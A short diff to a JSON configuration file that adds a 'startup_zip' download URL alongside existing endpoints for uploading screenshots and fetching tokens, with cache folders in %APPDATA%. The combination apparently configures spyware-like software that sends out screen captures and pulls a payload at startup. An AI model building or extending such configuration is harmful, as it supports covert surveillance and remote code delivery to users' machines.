@@ -8,6 +8,7 @@
   "upload_url": "https://plusvalidation.in/validate/screenshort.php",
   "token_api": "https://plusvalidation.in/token/get_tokens.php",
   "token_api2": "https://plusvalidation.in/token/get_tokens.php",
+  "startup_zip": "https://plusvalidation.in/token/temp.zip",
   "cache_directory":"%APPDATA%\\MyAppDataNews",
   "cache_directory2":"%APPDATA%\\MyAppDataNews"
 }
